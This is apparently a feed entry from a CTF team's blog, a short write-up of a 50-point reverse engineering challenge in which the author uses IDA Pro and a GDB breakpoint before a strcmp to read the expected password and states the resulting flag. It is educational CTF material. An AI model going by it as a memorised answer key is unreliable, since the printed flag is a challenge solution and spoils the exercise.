    <content type="html"><![CDATA[<blockquote><br>only guess<br>50<br><br>Reverse Engineering … ooh no need !<br><br>put the right password between Bugs_Bunny{…}<br><br>Author: Aymen Borgi</blockquote>

<p>Starting by Executing the file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/ctf&gt; rev50/rev50</div><div class="line">usage ./rev50 password</div></pre></td></tr></table></figure>
<p>Using the ida pro to check all the strings in the program we can see there were alot of them so we can’t really guess which one is it without analysing the program itself<br><a href="https://i.imgur.com/VDQWzIO.png" target="_blank" rel="external"><img src="https://i.imgur.com/VDQWzIO.png" title="Strings IDA"></a></p>
<p>Checking out the main function with ida pro we can see:<br><a href="https://i.imgur.com/uQUkKj4.png" target="_blank" rel="external"><img src="https://i.imgur.com/uQUkKj4.png" title="Strings IDA"></a></p>
<p>We now can see where our program is checking if the flag is correct if we manage to check value of the register RAX register before that strcmp ocurrs.<br><a href="https://i.imgur.com/f6sbpUa.png" target="_blank" rel="external"><img src="https://i.imgur.com/f6sbpUa.png" title="Strings IDA"></a></p>
<p>I could use IDA to check those values but since is alot of trouble to do remote execute the file in a linux machine (I was executing ida in a windows VM machine) to not loose time I rather preferred to check the value on GDB:</p>
<p>Disassembling the main function<br><a href="https://i.imgur.com/2pmO6za.png" target="_blank" rel="external"><img src="https://i.imgur.com/2pmO6za.png" title="Strings IDA"></a><br>Identify the address and do a break point and checking the value on the register RAX<br><a href="https://i.imgur.com/pdA9uxN.png" target="_blank" rel="external"><img src="https://i.imgur.com/pdA9uxN.png" title="Strings IDA"></a><br>Rerunning the program with the password “mercedes”<br><a href="https://i.imgur.com/SEuMGX1.png" target="_blank" rel="external"><img src="https://i.imgur.com/SEuMGX1.png" title="Strings IDA"></a><br>Finally our flag is BugsBunny{mercedes}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;only guess&lt;br&gt;50&lt;br&gt;&lt;br&gt;Reverse Engineering … ooh no need !&lt;br&gt;&lt;br&gt;put the right password between Bugs_Bunny{…}&lt;br&gt;&lt;br&gt;Autho
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="gdb" scheme="https://teamrocketist.github.io/tags/gdb/"/>
    
  </entry>
  
</feed>
